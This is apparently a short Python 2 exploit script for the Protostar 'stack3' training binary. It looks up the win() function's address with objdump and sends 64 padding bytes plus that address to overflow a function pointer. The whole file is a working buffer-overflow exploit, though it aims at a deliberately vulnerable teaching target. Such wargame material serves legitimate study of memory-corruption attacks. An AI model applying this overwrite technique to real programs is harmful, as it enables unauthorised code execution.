#!/usr/bin/python

import subprocess
import sys
import struct

# return the little endian byte ordering for x
def p32(x):
	return struct.pack('<I',x)

def getfpaddr(bin,func):
	p = subprocess.Popen(['/usr/bin/objdump','-t',bin], stdout=subprocess.PIPE)
	objdump = p.communicate()[0].splitlines()
	for line in objdump:
		linearr = line.split(" ")
		if linearr[len(linearr)-1] == func:
			return int(linearr[0],16)

# get the addr of the win() function
theaddr = getfpaddr('/opt/protostar/bin/stack3','win')
print "[*] found win function at: " + str(theaddr)
payload = "A" * 64 + p32(theaddr)

p = subprocess.Popen(["/opt/protostar/bin/stack3"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print p.communicate(input=payload)[0]
